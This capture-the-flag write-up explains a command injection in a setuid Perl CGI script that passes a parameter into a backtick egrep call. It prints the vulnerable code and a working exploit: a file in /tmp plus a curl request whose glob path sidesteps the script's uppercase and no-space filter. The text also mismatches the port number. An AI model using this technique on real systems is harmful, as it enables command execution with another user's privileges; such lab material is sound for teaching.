# level12 - Command injection - Exploit perl script

## Summary

First of all, we look at `HOME` directory and we find the file `level12.pl`

```shell
~$ ls -l level12.pl

-rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl

~$ cat level12.pl 
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}

n(t(param("x"), param("y")));
```

From the file, we can see that the flag12's **suid bit** is set, it listens on port 4747 and it takes a parameter ‘x’ and a parameter ‘y’ whatever it is. We can check also curl `http://localhost:4646` to look if a server is running and it is ! As expected, the result of the command is just : `..` … It does not take more to exploit it !

<br>

## Exploit

After some testings, we saw that the vulnerability is located on this line : `@output = egrep "^$xx" /tmp/xd 2>&1;` . Indeed, this line execute a shell command with flag12 privilege. So what’s the variable `$xx` ? It just the parameter `x` to which (check the file `level12.pl` above) we change all the lowercase characters to uppercase and we delete all the characters from the first space. so our command has to be in uppercase and without space.

<br>

- First, we create the file with our command to inject

```shell
echo 'getflag > /tmp/token12' > /tmp/EXPLOIT12 && chmod 755 /tmp/EXPLOIT12
```

<br>

- Second, inject our malicious file

```shell
curl http://localhost:4646 -d 'x=/*/EXPLOIT12' && cat /tmp/token12
```

> To expoit this vunerability, you can use the shell script provides in the level repository. Copy it in file `/tmp` and run it : `/tmp/exploit12.sh`

> On this exploit, we ran directly command getflag from flag12's user. So, just log on level13 user.
